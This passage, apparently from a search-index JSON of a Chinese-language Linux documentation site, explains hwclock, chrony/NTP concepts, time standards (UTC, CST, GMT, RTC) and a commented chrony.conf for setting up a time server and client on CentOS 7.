hwclock\u662f\u4e00\u4e2a\u65f6\u949f\u7ba1\u7406\u5de5\u5177\u3002\u5b83\u53ef\u4ee5\uff1a\u663e\u793a\u786c\u4ef6\u65f6\u949f\u65f6\u95f4\uff1b\u5c06\u786c\u4ef6\u65f6\u949f\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u65f6\u95f4\uff1b\u4ece\u7cfb\u7edf\u65f6\u949f\u8bbe\u7f6e\u786c\u4ef6\u65f6\u949f\uff1b\u8bbe\u5b9a\u6765\u81ea\u786c\u4ef6\u65f6\u949f\u7684\u7cfb\u7edf\u65f6\u949f\uff1b\u786c\u4ef6\u8865\u507f\u65f6\u949f\u6f02\u79fb\uff1b\u66f4\u6b63\u7cfb\u7edf\u65f6\u949f\u65f6\u95f4\u523b\u5ea6\uff1b\u8bbe\u7f6e\u5185\u6838\u7684\u65f6\u533a\u3001NTP \u65f6\u95f4\u523b\u5ea6\u548c\u7eaa\u5143\uff08\u4ec5\u9650 Alpha\uff09\uff1b\u5e76\u9884\u6d4b\u57fa\u4e8e\u5176\u6f02\u79fb\u7387\u7684\u672a\u6765\u786c\u4ef6\u65f6\u949f\u503c -h, --help \u663e\u793a\u6b64\u5e2e\u52a9\u5e76\u9000\u51fa -r, --show \u8bfb\u53d6\u786c\u4ef6\u65f6\u949f\u5e76\u6253\u5370\u7ed3\u679c --set \u5c06 RTC \u8bbe\u7f6e\u4e3a --date \u6307\u5b9a\u7684\u65f6\u95f4 -s, --hctosys \u4ece\u786c\u4ef6\u65f6\u949f\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4 -w, --systohc \u4ece\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\u8bbe\u7f6e\u786c\u4ef6\u65f6\u949f --systz \u57fa\u4e8e\u5f53\u524d\u65f6\u533a\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4 --adjust \u6839\u636e\u81ea\u4e0a\u6b21\u65f6\u949f\u8bbe\u7f6e\u6216\u8c03\u6574\u540e\u7684\u7cfb\u7edf\u6f02\u79fb \u6765\u8c03\u6574 RTC -c, --compare \u5b9a\u671f\u5c06\u7cfb\u7edf\u65f6\u949f\u4e0e CMOS \u65f6\u949f\u76f8\u6bd4\u8f83 --getepoch \u6253\u5370\u5185\u6838\u7684\u786c\u4ef6\u65f6\u949f\u7eaa\u5143(epoch)\u503c --setepoch \u5c06\u5185\u6838\u7684\u786c\u4ef6\u65f6\u949f\u7eaa\u5143(epoch)\u503c\u8bbe\u7f6e\u4e3a --epoch \u9009\u9879\u6307\u5b9a\u7684\u503c --predict \u9884\u6d4b --date \u9009\u9879\u6240\u6307\u5b9a\u65f6\u523b\u8bfb\u53d6\u5230\u7684 RTC \u503c -V, --version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa \u9009\u9879\uff1a -u, --utc \u786c\u4ef6\u65f6\u949f\u4fdd\u6301\u4e3a UTC \u65f6\u95f4 --localtime \u786c\u4ef6\u65f6\u949f\u4fdd\u6301\u4e3a\u672c\u5730\u65f6\u95f4 -f, --rtc <\u6587\u4ef6> \u4ee3\u66ff\u9ed8\u8ba4\u6587\u4ef6\u7684\u7279\u6b8a /dev/... \u6587\u4ef6 --directisa \u76f4\u63a5\u8bbf\u95ee ISA \u603b\u7ebf\uff0c\u800c\u975e /dev/rtc --badyear \u5ffd\u7565 RTC \u5e74\u4efd(\u7531\u4e8e BIOS \u635f\u574f) --date <\u65f6\u95f4> \u6307\u5b9a\u8981\u8bbe\u7f6e\u7684\u786c\u4ef6\u65f6\u949f\u65f6\u95f4 --epoch <\u5e74> \u6307\u5b9a\u4f5c\u4e3a\u786c\u4ef6\u7eaa\u5143(epoch)\u503c\u8d77\u59cb\u7684\u5e74\u4efd --noadjfile \u4e0d\u8bbf\u95ee /etc/adjtime\uff1b\u9700\u8981\u4f7f\u7528 --utc \u6216 --localtime \u9009\u9879 --adjfile <\u6587\u4ef6> \u6307\u5b9a\u8c03\u6574\u6587\u4ef6\u7684\u8def\u5f84\uff1b \u9ed8\u8ba4\u4e3a /etc/adjtime --test \u4e0d\u66f4\u65b0\uff0c\u53ea\u663e\u793a\u5c06\u8fdb\u884c\u4ec0\u4e48\u64cd\u4f5c -D, --debug \u8c03\u8bd5\u6a21\u5f0f --version\uff1a\u663e\u793a\u7248\u672c\u4fe1\u606f\u3002","title":"\u65f6\u95f4\u540c\u6b65chrony"},{"location":"system/centos7/chronyd/#chrony","text":"chrony \u662f\u7f51\u7edc\u65f6\u95f4\u534f\u8bae \uff08NTP\uff09 \u7684\u591a\u529f\u80fd\u5b9e\u73b0\u3002\u5b83\u53ef\u4ee5\u5c06\u7cfb\u7edf\u65f6\u949f\u4e0eNTP\u670d\u52a1\u5668\uff0c\u53c2\u8003\u65f6\u949f\uff08\u4f8b\u5982GPS\u63a5\u6536\u5668\uff09\u4ee5\u53ca\u4f7f\u7528\u952e\u76d8\u7684\u624b\u52a8\u8f93\u5165\u540c\u6b65\u3002\u5b83\u8fd8\u53ef\u4ee5\u4f5c\u4e3a NTPv4 \uff08RFC 5905\uff09 \u670d\u52a1\u5668\u548c\u5bf9\u7b49\u4f53\u8fd0\u884c\uff0c\u4e3a\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u63d0\u4f9b\u65f6\u95f4\u670d\u52a1\u3002 chrony \u7531\u4e24\u4e2a\u7a0b\u5e8f\u7ec4\u6210\uff0c\u5206\u522b\u662f chronyd \u548c chronyc chronyd \u662f\u4e00\u4e2a\u540e\u53f0\u8fd0\u884c\u7684\u5b88\u62a4\u8fdb\u7a0b\uff0c\u7528\u4e8e\u8c03\u6574\u5185\u6838\u4e2d\u8fd0\u884c\u7684\u7cfb\u7edf\u65f6\u949f\u548c\u65f6\u949f\u670d\u52a1\u5668\u540c\u6b65\u3002\u5b83\u786e\u5b9a\u8ba1\u7b97\u673a\u589e\u51cf\u65f6\u95f4\u7684\u6bd4\u7387\uff0c\u5e76\u5bf9\u6b64\u8fdb\u884c\u8865\u507f\u3002 chronyc \u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u7528\u4e8e\u76d1\u63a7\u6027\u80fd\u5e76\u8fdb\u884c\u591a\u6837\u5316\u7684\u914d\u7f6e\u3002\u5b83\u53ef\u4ee5\u5728 chronyd \u5b9e\u4f8b\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e00\u53f0\u4e0d\u540c\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\u3002 ntp \u662f\u7f51\u7edc\u65f6\u95f4\u534f\u8bae\uff08Network Time Protocol\uff09\u7684\u7b80\u79f0\uff0c\u901a\u8fc7 udp 123 \u7aef\u53e3\u8fdb\u884c\u7f51\u7edc\u65f6\u949f\u540c\u6b65\u3002 RHEL7 \u4e2d\u9ed8\u8ba4\u4f7f\u7528 chrony \u4f5c\u4e3a\u65f6\u95f4\u670d\u52a1\u5668\uff0c\u4e5f\u652f\u6301NTP\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5\u3002 ntp \u4e0e chrony \u4e0d\u80fd\u540c\u65f6\u5b58\u5728 chrony \u7684\u8bbe\u8ba1\u5373\u4f7f\u5728\u56f0\u96be\u7684\u6761\u4ef6\u4e0b\uff0c\u5982\u95f4\u6b47\u6027\u7f51\u7edc\u8fde\u63a5\u548c\u62e5\u585e\u7684\u7f51\u7edc\uff0c\u4e5f\u80fd\u540c\u6b65\u65f6\u95f4\u3002\u4e0e ntpd \u4e0d\u540c\uff0c\u5b83\u652f\u6301\u901a\u8fc7\u786c\u4ef6\u65f6\u95f4\u6233\u540c\u6b65\u7cfb\u7edf\u65f6\u949f\uff0c\u4ece\u800c\u63d0\u9ad8 LAN \u4e0a\u8ba1\u7b97\u673a\u4e4b\u95f4\u65f6\u95f4\u540c\u6b65\u7684\u51c6\u786e\u6027\u3002\u5b83\u8fd8\u652f\u6301\u624b\u52a8\u8f93\u5165\u540c\u6b65\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u9694\u79bb\u7f51\u7edc\u5185\u6267\u884c\u65f6\u95f4\u6821\u6b63\u3002 chrony\u5b98\u7f51\uff1ahttps://chrony.tuxfamily.org/index.html chrony\u7684\u8bbe\u8ba1\u6027\u80fd\u4e0a\u6bd4ntp\u66f4\u52a0\u597d\uff0c\u8fd9\u4e2a\u662f\u5bf9\u6bd4\uff1ahttps://chrony.tuxfamily.org/comparison.html","title":"chrony\u670d\u52a1"},{"location":"system/centos7/chronyd/#_1","text":"","title":"\u524d\u63d0\u77e5\u8bc6"},{"location":"system/centos7/chronyd/#utc","text":"utc\u662f\u534f\u8c03\u4e16\u754c\u65f6\uff0c\u53c8\u79f0\u4e16\u754c\u7edf\u4e00\u65f6\u95f4\u3001\u4e16\u754c\u6807\u51c6\u65f6\u95f4\u3001\u56fd\u9645\u534f\u8c03\u65f6\u95f4\u3002 \u534f\u8c03\u4e16\u754c\u65f6 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) UTC + (+0800) =\u5317\u4eac\u65f6\u95f4 Linux\u67e5\u770b\u672c\u5730UTC\u65f6\u95f4\uff1a date -u Wed Oct 5 18:57:38 UTC 2022 \u5c31\u8fd9\u4e1c\u897f\u4f7f\u7528\u95f0\u79d2\uff0c\u95f0\u79d2\u5bfc\u81f4\u5927\u9762\u79ef\u5b95\u673a \u5c31\u56e0\u4e3a\u8fd9\u4e00\u79d2\u949f\uff0c\u79d1\u6280\u5de8\u5934\u5435\u4e86\u5feb\u5341\u5e74 (qq.com)","title":"UTC\u65f6\u95f4"},{"location":"system/centos7/chronyd/#cst","text":"\u65f6\u95f4\u7f29\u5199\uff0cCST\u53ef\u89c6\u4e3a\u7f8e\u56fd\u3001\u6fb3\u5927\u5229\u4e9a\u3001\u53e4\u5df4\u6216\u4e2d\u56fd\u7684\u6807\u51c6\u65f6\u95f4\u3002 \u7f8e\u56fd\u4e2d\u90e8\u65f6\u95f4\uff1aCentral Standard Time (USA) UT-6:00 \u6fb3\u5927\u5229\u4e9a\u4e2d\u90e8\u65f6\u95f4\uff1aCentral Standard Time (Australia) UT+9:30 \u4e2d\u56fd\u6807\u51c6\u65f6\u95f4\uff1aChina Standard Time UT+8:00 \u53e4\u5df4\u6807\u51c6\u65f6\u95f4\uff1aCuba Standard Time UT-4:00","title":"CST\u65f6\u95f4"},{"location":"system/centos7/chronyd/#gmt","text":"\u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 \u683c\u6797\u5a01\u6cbb\u5e73\u65f6 (GMT, Greenwich Mean Time) \u4f5c\u4e3a\u4e16\u754c\u65f6\u95f4\u6807\u51c6\uff08UT, Universal Time\uff09 GMT\u662f\u524d\u4e16\u754c\u6807\u51c6\u65f6\uff0cUTC\u662f\u73b0\u4e16\u754c\u6807\u51c6\u65f6\u3002 UTC \u6bd4 GMT\u66f4\u7cbe\u51c6\uff0c\u4ee5\u539f\u5b50\u65f6\u8ba1\u65f6\uff0c\u9002\u5e94\u73b0\u4ee3\u793e\u4f1a\u7684\u7cbe\u786e\u8ba1\u65f6\u3002 \u4f46\u5728\u4e0d\u9700\u8981\u7cbe\u786e\u5230\u79d2\u7684\u60c5\u51b5\u4e0b\uff0c\u4e8c\u8005\u53ef\u4ee5\u89c6\u4e3a\u7b49\u540c\u3002","title":"GMT\u65f6\u95f4"},{"location":"system/centos7/chronyd/#rtc","text":"RTC\u662f\u82af\u7247\u5185\u7f6e\u7684\u786c\u4ef6\u65f6\u949f\uff0c\u53ea\u8981\u82af\u7247\u4e0d\u65ad\u7535\uff0c\u5373\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u5173\u673a\u7684\u65f6\u5019\uff0cRTC\u65f6\u949f\u4e5f\u662f\u6b63\u5e38\u5728\u8d70\u7684\uff0c\u6240\u4ee5\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5173\u673a\u91cd\u542f\u540e\uff0c\u53ef\u901a\u8fc7\u8bfb\u53d6RTC\u65f6\u95f4\u6765\u66f4\u65b0\u7cfb\u7edf\u65f6\u95f4\u3002 \u67e5\u770bRTC\u65f6\u95f4 hwclock -r","title":"RTC\u65f6\u95f4"},{"location":"system/centos7/chronyd/#_2","text":"\u7531\u5185\u6838\u7ef4\u62a4\u7684\u8f6f\u4ef6\u65f6\u949f\u3002\u5b83\u662f\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u4e3b\u65f6\u949f\u3002 \u67e5\u770b\u7cfb\u7edf\u65f6\u95f4 date","title":"\u7cfb\u7edf\u65f6\u95f4"},{"location":"system/centos7/chronyd/#chrony_1","text":"[root@VM-0-16-centos ~]# yum install -y chrony [root@VM-0-16-centos ~]# rpm -ql chrony-3.4-1.el7.x86_64 /etc/NetworkManager/dispatcher.d/20-chrony /etc/chrony.conf /etc/chrony.keys /etc/dhcp/dhclient.d/chrony.sh /etc/logrotate.d/chrony /etc/sysconfig/chronyd /usr/bin/chronyc /usr/lib/systemd/ntp-units.d/50-chronyd.list /usr/lib/systemd/system/chrony-dnssrv@.service /usr/lib/systemd/system/chrony-dnssrv@.timer /usr/lib/systemd/system/chrony-wait.service /usr/lib/systemd/system/chronyd.service /usr/libexec/chrony-helper /usr/sbin/chronyd /usr/share/doc/chrony-3.4 /usr/share/doc/chrony-3.4/COPYING /usr/share/doc/chrony-3.4/FAQ /usr/share/doc/chrony-3.4/NEWS /usr/share/doc/chrony-3.4/README /usr/share/man/man1/chronyc.1.gz /usr/share/man/man5/chrony.conf.5.gz /usr/share/man/man8/chronyd.8.gz /var/lib/chrony /var/lib/chrony/drift /var/lib/chrony/rtc /var/log/chrony","title":"chrony \u8f6f\u4ef6\u5305"},{"location":"system/centos7/chronyd/#chrony_2","text":"\u4fee\u6539chrony\u7684\u914d\u7f6e\uff0c\u7136\u540e\u542f\u52a8\u5373\u53ef [root@VM-0-16-centos ~]# cat /etc/chrony.conf server ntpupdate.tencentyun.com iburst # \u4ece\u54ea\u4e2a\u670d\u52a1\u5668\u4e0a\u540c\u6b65\u65f6\u95f4\uff0c\u683c\u5f0f\u4e3a server xxx.xxx.xxx [\u9009\u9879] # \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u5176\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u6307\u5b9a\u3002\u5982\u679c\u65e0\u6cd5\u5728\u542f\u52a8\u65f6\u89e3\u6790\u4e3b\u673a\u540d\uff0cchronyd \u5c06\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u518d\u6b21\u5c1d\u8bd5 # \u6b64\u6307\u4ee4\u53ef\u4ee5\u591a\u6b21\u7528\u4e8e\u6307\u5b9a\u591a\u4e2a\u670d\u52a1\u5668\u3002 # \u8be5\u6307\u4ee4\u652f\u6301\u4ee5\u4e0b\u9009\u9879\uff1a # minpoll poll # \u6b64\u9009\u9879\u5c06\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u4e4b\u95f4\u7684\u6700\u5c0f\u95f4\u9694\u6307\u5b9a\u4e3a2\u6b21\u5e42\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u4f8b\u5982\uff0cminpoll 5 \u610f\u5473\u7740\u8f6e\u8be2\u95f4\u9694\u4e0d\u5e94\u4f4e\u4e8e 32\u79d2\u3002\u9ed8\u8ba4\u503c\u4e3a6\uff0864\u79d2\uff09\uff0c\u6700\u5c0f\u503c\u4e3a-7\uff081/128 \u79d2\uff09\uff0c\u6700\u5927\u503c\u4e3a24\uff086 \u4e2a\u6708\uff09\u3002\u8bf7\u6ce8\u610f\uff0c\u77ed\u4e8e6\uff0864 \u79d2\uff09\u7684\u95f4\u9694\u901a\u5e38\u4e0d\u5e94\u4e0e Internet \u4e0a\u7684\u516c\u5171\u670d\u52a1\u5668\u4e00\u8d77\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u88ab\u89c6\u4e3a\u6ee5\u7528\u3002\u4ec5\u5f53\u670d\u52a1\u5668\u53ef\u8bbf\u95ee\u4e14\u5f80\u8fd4\u5ef6\u8fdf\u77ed\u4e8e 10 \u6beb\u79d2\uff08\u5373\u670d\u52a1\u5668\u5e94\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e2d\uff09\u65f6\uff0c\u624d\u4f1a\u542f\u7528\u4e9a\u79d2\u7ea7\u95f4\u9694\u3002 # maxpoll poll # \u6b64\u9009\u9879\u5c06\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u4e4b\u95f4\u7684\u6700\u5927\u95f4\u9694\u6307\u5b9a\u4e3a2\u6b21\u5e42\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u4f8b\u5982\uff0cmaxpoll 9 \u8868\u793a\u8f6e\u8be2\u95f4\u9694\u5e94\u4fdd\u6301\u5728\u6216\u4f4e\u4e8e9\uff08512 \u79d2\uff09\u3002\u9ed8\u8ba4\u503c\u4e3a10\uff081024 \u79d2\uff09\uff0c\u6700\u5c0f\u503c\u4e3a -7\uff081/128 \u79d2\uff09\uff0c\u6700\u5927\u503c\u4e3a 24\uff086 \u4e2a\u6708\uff09\u3002 # iburst # chronyd \u5c06\u4ece4-8\u4e2a\u591a\u4e2a\u8bf7\u6c42\u5f00\u59cb\uff0c\u4ee5\u4fbf\u66f4\u5feb\u5730\u8fdb\u884c\u65f6\u949f\u7684\u9996\u6b21\u66f4\u65b0\u3002\u5b83\u8fd8\u4f1a\u5728\u6bcf\u6b21\u4f7f\u7528 chronyc \u4e2d\uff0c\u4ece\u8131\u673a\u72b6\u6001\u5207\u6362\u5230\u8054\u673a\u65f6\u4e5f\u4f1a\u7528\u591a\u4e2a\u8bf7\u6c42\u3002 # burst # chronyd \u6700\u591a\u4f7f\u75284\u4e2a\u8bf7\u6c42 # key ID # NTP \u534f\u8bae\u652f\u6301\u6d88\u606f\u8eab\u4efd\u9a8c\u8bc1\u4ee3\u7801 \uff08MAC\uff09\uff0c\u4ee5\u9632\u6b62\u8ba1\u7b97\u673a\u56e0\u5411\u5176\u53d1\u9001\u6076\u610f\u6570\u636e\u5305\u800c\u5bfc\u81f4\u7cfb\u7edf\u65f6\u95f4\u4e2d\u65ad # nts # \u6b64\u9009\u9879\u542f\u7528\u4f7f\u7528\u7f51\u7edc\u65f6\u95f4\u5b89\u5168\u6027 \uff08NTS\uff09 \u673a\u5236\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002 # certset ID # \u6b64\u9009\u9879\u6307\u5b9a\u5728\u542f\u7528 nts \u9009\u9879\u65f6\u5e94\u4f7f\u7528\u54ea\u7ec4\u53d7\u4fe1\u4efb\u7684\u8bc1\u4e66\u6765\u9a8c\u8bc1\u670d\u52a1\u5668\u7684\u8bc1\u4e66\u3002 # maxdelay # maxdelay 0.3 \u8868\u793a\u5e94\u5ffd\u7565\u5f80\u8fd4\u5ef6\u8fdf\u5927\u4e8e 0.3 \u79d2\u7684\u6d4b\u91cf\u503c\u3002\u9ed8\u8ba4\u503c\u4e3a 3 \u79d2\uff0c\u6700\u5927\u503c\u4e3a 1000 \u79d2\u3002 # offline # \u5982\u679c\u5728\u542f\u52a8 chronyd \u65f6\u65e0\u6cd5\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u5219\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u8131\u673a\u9009\u9879\u3002chronyd \u4e0d\u4f1a\u5c1d\u8bd5\u8f6e\u8be2\u670d\u52a1\u5668\uff0c\u76f4\u5230\u5b83\u80fd\u591f\u8fd9\u6837\u505a # auto_offline # \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u5f53\u53d1\u9001\u8bf7\u6c42\u5931\u8d25\u65f6\uff0c\u670d\u52a1\u5668\u5c06\u88ab\u5047\u5b9a\u4e3a\u5df2\u8131\u673a\uff0c driftfile /var/lib/chrony/drift # \u8bb0\u5f55\u7cfb\u7edf\u65f6\u949f\u83b7\u5f97/\u4e22\u5931\u65f6\u95f4\u7684\u901f\u7387\u7684\u6587\u4ef6 makestep 1.0 3 #\u5982\u679c\u504f\u79fb\u5927\u4e8e1\u79d2\uff0c\u5141\u8bb8\u5728\u524d\u4e09\u6b21\u66f4\u65b0\u4e2d\u8c03\u6574\u7cfb\u7edf\u65f6\u949f rtcsync # rtcsync \u6307\u4ee4\u542f\u7528\u4e86\u4e00\u79cd\u6a21\u5f0f\uff0c\u5728\u8be5\u6a21\u5f0f\u4e0b\uff0c\u7cfb\u7edf\u65f6\u95f4\u5b9a\u671f\u590d\u5236\u5230 RTC,RTC\u65f6\u95f4\u53ef\u4ee5\u901a\u8fc7hwclock -r\u67e5\u770b\u3002 #hwtimestamp * # \u5728\u6240\u6709\u652f\u6301\u786c\u4ef6\u65f6\u95f4\u6233\u7684\u63a5\u53e3\u4e0a\u542f\u7528\u786c\u4ef6\u65f6\u95f4\u6233. #minsources 2 # \u6307\u4ee4\u8bbe\u7f6e\u5728\u66f4\u65b0\u672c\u5730\u65f6\u949f\u4e4b\u524d\uff0c\u9700\u8981\u5728\u6e90\u9009\u62e9\u7b97\u6cd5\u4e2d\u88ab\u89c6\u4e3a\u53ef\u9009\u62e9\u7684\u6e90\u7684\u6700\u5c0f\u6570\u76ee\u3002\u9ed8\u8ba4\u503c\u4e3a 1\u3002\u5c06\u6b64\u9009\u9879\u8bbe\u7f6e\u4e3a\u8f83\u5927\u7684\u6570\u5b57\u53ef\u7528\u4e8e\u63d0\u9ad8\u53ef\u9760\u6027\u3002\u66f4\u591a\u7684\u6e90\u5c06\u4e0d\u5f97\u4e0d\u76f8\u4e92\u540c\u610f\uff0c\u5e76\u4e14\u5f53\u53ea\u6709\u4e00\u4e2a\u6e90\uff08\u53ef\u80fd\u63d0\u4f9b\u4e0d\u6b63\u786e\u7684\u65f6\u95f4\uff09\u53ef\u8bbf\u95ee\u65f6\uff0c\u65f6\u949f\u5c06\u4e0d\u4f1a\u66f4\u65b0 allow 192.168.0.0/16 # allow \u6307\u4ee4\u7528\u4e8e\u6307\u5b9a\u5141\u8bb8 NTP \u5ba2\u6237\u7aef\u4f5c\u4e3a NTP \u670d\u52a1\u5668\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u7279\u5b9a\u5b50\u7f51\u3002\u5b83\u8fd8\u63a7\u5236\u5728\u670d\u52a1\u5668\u4e0a\u542f\u7528 NTS \u65f6\u5bf9 NTS-KE \u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u3002 # \u9ed8\u8ba4\u8bbe\u7f6e\u662f\u4e0d\u5141\u8bb8\u4efb\u4f55\u5ba2\u6237\u7aef\u8bbf\u95ee\uff0c\u5373 chronyd \u7eaf\u7cb9\u4f5c\u4e3a NTP \u5ba2\u6237\u7aef\u8fd0\u884c\u3002\u5982\u679c\u4f7f\u7528 allow \u6307\u4ee4\uff0c\u5219 chronyd \u65e2\u662f\u5176\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\uff0c\u4e5f\u662f\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u670d\u52a1\u5668\u3002 # \u6b64\u6307\u4ee4\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\u3002\u8bfb\u53d6\u7684\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b #local stratum 10 # local \u6307\u4ee4\u542f\u7528\u4e86\u672c\u5730\u6a21\u5f0f\uff0c\u5373\u4f7f\u6ca1\u6709\u4e0e\u65f6\u95f4\u6e90\u540c\u6b65\uff0c\u4e5f\u8981\u670d\u52a1 #keyfile /etc/chrony.keys # \u5bc6\u94a5\u6587\u4ef6 logdir /var/log/chrony # \u6b64\u6307\u4ee4\u6307\u5b9a\u7528\u4e8e\u5199\u5165\u7531 log \u6307\u4ee4\u542f\u7528\u7684\u65e5\u5fd7\u6587\u4ef6\u7684\u76ee\u5f55\u3002\u5982\u679c\u8be5\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u5c06\u81ea\u52a8\u521b\u5efa\u8be5\u76ee\u5f55\u3002 #cmdport 323 #\u9ed8\u8ba4\u4e3a323\uff0c\u7528\u4e8e\u76d1\u89c6chronyd\u7684\u7aef\u53e3 #port 123 #\u5f53chronyd\u4f5c\u4e3aNTP\u670d\u52a1\u5668\u7684\u65f6\u5019\u6253\u5f00\u7684\u76d1\u542c\u7aef\u53e3\uff0cntp\u5ba2\u6237\u7aef\u4f1a\u901a\u8fc7\u8fd9\u4e2a\u7aef\u53e3\u4e0echronyd\u670d\u52a1\u5668\u8fdb\u884c\u540c\u6b65\u3002\u9ed8\u8ba4\u503c\u4e3a 123\uff0c\u5373\u6807\u51c6 NTP \u7aef\u53e3\u3002\u5982\u679c\u8bbe\u7f6e\u4e3a 0\uff0cchronyd \u5c06\u6c38\u8fdc\u4e0d\u4f1a\u6253\u5f00\u670d\u52a1\u5668\u7aef\u53e3\uff0c\u5e76\u5c06\u4e25\u683c\u5728\u4ec5\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002 #log tracking #\u628a\u6bcf\u6b21\u4fee\u6539\u65f6\u95f4\u7684\u8bb0\u5f55\u5199\u5230tracking.log\u4e2d\u53bb \u66f4\u591a\u914d\u7f6e\u7ec6\u8282\u8bf7\u67e5\u770bchrony\u5b98\u7f51\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chrony.conf.html \u542f\u52a8chronyd systemctl enable chronyd systemctl restart chronyd","title":"chrony\u4f5c\u4e3a\u670d\u52a1\u7aef"},{"location":"system/centos7/chronyd/#chrony_3","text":"\u4fee\u6539chrony\u7684\u914d\u7f6e [root@VM-0-16-centos ~]# cat /etc/chrony.conf # \u8fd9\u91cc\u6539\u6210\u670d\u52a1\u7aef\u7684IP\u6216\u8005\u57df\u540d server xxx.xxx.xxx iburst \u542f\u52a8chronyd systemctl enable chronyd systemctl restart chronyd","title":"chrony\u4f5c\u4e3a\u5ba2\u6237\u7aef"},{"location":"system/centos7/chronyd/#chronyd","text":"\u8bed\u6cd5 chronyd [\u9009\u9879]...[\u6307\u4ee4]... \u529f\u80fd chronyd\u662f\u7528\u4e8e\u540c\u6b65\u7cfb\u7edf\u65f6\u949f\u7684\u5b88\u62a4\u8fdb\u7a0b\u3002\u5b83\u53ef\u4ee5\u5c06\u7cfb\u7edf\u65f6\u95f4\u4e0eNTP\u670d\u52a1\u5668\uff0c\u53c2\u8003\u65f6\u949f\uff08\u4f8b\u5982GPS\u63a5\u6536\u5668\uff09\u540c\u6b65\uff0c\u5e76\u901a\u8fc7chronyd\u4f7f\u7528\u952e\u76d8\u8fdb\u884c\u624b\u52a8\u8f93\u5165\u3002\u5b83\u8fd8\u53ef\u4ee5\u4f5c\u4e3a NTPv4 \uff08RFC 5905\uff09\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u4e3a\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u63d0\u4f9b\u65f6\u95f4\u670d\u52a1\u3002 \u5982\u679c\u672a\u5728\u547d\u4ee4\u884c\u4e0a\u6307\u5b9a\u4efb\u4f55\u914d\u7f6e\u6307\u4ee4\uff0cchronyd \u5c06\u4ece\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5b83\u4eec\u3002\u6587\u4ef6\u7684\u7f16\u8bd1\u9ed8\u8ba4\u4f4d\u7f6e\u662f /etc/chrony.conf\u3002 \u4fe1\u606f\u6027\u6d88\u606f\u3001\u8b66\u544a\u548c\u9519\u8bef\u5c06\u8bb0\u5f55\u5230\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u3002 \u9009\u9879 -4 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv4 \u5730\u5740\uff0c\u5e76\u4e14\u4ec5\u521b\u5efa IPv4 \u5957\u63a5\u5b57\u3002 -6 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv6 \u5730\u5740\uff0c\u5e76\u4e14\u4ec5\u521b\u5efa IPv6 \u5957\u63a5\u5b57\u3002 -f \u6587\u4ef6 \u6b64\u9009\u9879\u53ef\u7528\u4e8e\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\u7684\u5907\u7528\u4f4d\u7f6e\u3002\u7f16\u8bd1\u7684\u9ed8\u8ba4\u503c\u4e3a /etc/chrony.conf\u3002 -n \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5c06\u81ea\u5df1\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002 -d \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5c06\u81ea\u5df1\u4e0e\u7ec8\u7aef\u5206\u79bb\uff0c\u5e76\u4e14\u6240\u6709\u6d88\u606f\u90fd\u5c06\u5199\u5165\u7ec8\u7aef\u800c\u4e0d\u662f syslog\u3002\u5982\u679c chronyd 